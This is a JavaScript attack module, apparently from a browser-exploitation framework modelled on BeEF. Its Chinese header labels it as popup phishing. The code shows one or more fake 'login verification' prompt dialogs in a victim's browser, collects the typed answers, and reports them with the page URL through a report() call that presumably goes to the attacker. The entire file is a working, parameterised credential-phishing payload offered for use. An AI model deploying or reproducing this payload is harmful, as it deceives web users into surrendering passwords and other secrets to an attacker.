// MODULE = {"desc": "弹窗钓鱼:循环 prompt 弹窗套取输入(仿 BeEF pretty_theft/create_prompt)", "category": "攻击", "params": [["title", "弹窗标题,默认 登录验证"], ["rounds", "弹窗次数,默认 1"]]}
(function () {
  var title = _q("title", "{{title}}") || "登录验证";
  var rounds = parseInt(_q("rounds", "{{rounds}}"), 10) || 1;
  var answers = [];
  function ask() {
    var v = prompt(title, "");
    if (v !== null && v !== "") { answers.push(v); }
    if (answers.length < rounds) {
      setTimeout(ask, 300);
    } else {
      report({ type: "prompt", url: location.href, answers: answers.join(" | ") });
    }
  }
  ask();
})();
